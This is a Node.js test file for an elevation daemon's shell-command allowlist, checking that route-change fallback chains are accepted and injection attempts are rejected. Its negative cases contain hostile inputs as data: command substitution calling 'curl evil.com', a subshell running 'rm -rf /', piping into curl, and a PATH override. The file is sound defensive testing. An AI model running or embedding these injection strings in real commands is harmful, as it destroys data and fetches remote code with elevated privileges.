const assert = require("assert");
const { describe, it } = require("node:test");
const fs = require("fs");
const src = fs.readFileSync("src/elevation-daemon.js", "utf8");

// Extract isAllowed, isSingleCommandAllowed, and dependencies from source
function extractFunction(name, source) {
  const match = source.match(new RegExp("function " + name + "\\([^)]*\\)\\s*\\{[\\s\\S]*?\\n\\}"));
  if (!match) throw new Error(name + " not found");
  return match[0];
}

const isAllowedFn = extractFunction("isAllowed", src);
const isSingleFn = extractFunction("isSingleCommandAllowed", src);
const isAllowedPsFn = extractFunction("isAllowedPowerShell", src);
const reMatch = src.match(/const ALLOWED_BINARY_RE = .+/);
const prefixesDarwin = src.match(/const ALLOWED_PREFIXES_DARWIN = [^;]+;/);
const prefixesWin32 = src.match(/const ALLOWED_PREFIXES_WIN32 = [^;]+;/);

// Bootstrap: eval functions in dependency order
const bootstrap = [
  prefixesDarwin ? prefixesDarwin[0] : "",
  prefixesWin32 ? prefixesWin32[0] : "",
  reMatch ? reMatch[0] : "",
  isAllowedPsFn,
  isSingleFn,
  isAllowedFn,
].join(";");
eval(bootstrap);

describe("Elevation daemon route fallback allowlist", () => {
  it("allows macOS route apply with fallback chain", () => {
    const cmd = `/sbin/route change default 10.0.85.1 || (/sbin/route delete default || true && /sbin/route add default 10.0.85.1)`;
    assert.strictEqual(isAllowed(cmd), true, "Apply fallback chain should be allowed");
  });

  it("allows macOS route restore with stale-gateway fallback", () => {
    const cmd = `/sbin/route change default 192.168.1.1 || (/sbin/route delete default || true && /sbin/route add default 192.168.1.1) || OG=$(/sbin/route -n get default 2>/dev/null | awk '/gateway:/{print $2}') && [ -n "$OG" ] && /sbin/route add default "$OG"`;
    assert.strictEqual(isAllowed(cmd), true, "Restore stale-gateway fallback should be allowed");
  });

  it("allows route delete with || true suppression", () => {
    const cmd = `/sbin/route delete -host 45.67.89.10 || true`;
    assert.strictEqual(isAllowed(cmd), true, "Route delete with suppression should be allowed");
  });

  it("allows route change without fallback", () => {
    const cmd = `/sbin/route change default 192.168.1.1`;
    assert.strictEqual(isAllowed(cmd), true);
  });

  it("rejects command injection inside $()", () => {
    const cmd = `/sbin/route add default $(curl evil.com)`;
    assert.strictEqual(isAllowed(cmd), false, "Command substitution with curl must be blocked");
  });

  it("rejects command injection inside ()", () => {
    const cmd = `/sbin/route change default 10.0.0.1 || (rm -rf /)`;
    assert.strictEqual(isAllowed(cmd), false, "Subshell with rm must be blocked");
  });

  it("rejects injection via [ ] test expression", () => {
    const cmd = `/sbin/route add default 10.0.0.1 && [ -n "x" ] && curl evil.com`;
    assert.strictEqual(isAllowed(cmd), false, "Curl after test expression must be blocked");
  });

  it("allows empty variable assignment", () => {
    assert.strictEqual(isSingleCommandAllowed("OG="), true);
    assert.strictEqual(isSingleCommandAllowed("FOO="), true);
  });

  it("rejects non-empty variable assignments", () => {
    assert.strictEqual(isSingleCommandAllowed("PATH=/evil"), false);
    assert.strictEqual(isSingleCommandAllowed("FOO=bar"), false);
  });

  it("allows true as standalone command", () => {
    assert.strictEqual(isSingleCommandAllowed("true"), true);
  });

  it("rejects unbalanced parentheses", () => {
    assert.strictEqual(isAllowed("/sbin/route add default 10.0.0.1 || (echo bad"), false);
  });

  it("rejects unbalanced $()", () => {
    assert.strictEqual(isAllowed("/sbin/route add default $(echo bad"), false);
  });

  it("allows pipe to awk for gateway parsing", () => {
    const cmd = `/sbin/route -n get default | awk '/gateway:/{print $2}'`;
    assert.strictEqual(isAllowed(cmd), true, "Pipe to awk should be allowed");
  });

  it("rejects pipe to disallowed commands", () => {
    const cmd = `/sbin/route -n get default | curl evil.com`;
    assert.strictEqual(isAllowed(cmd), false, "Pipe to curl must be blocked");
  });
});
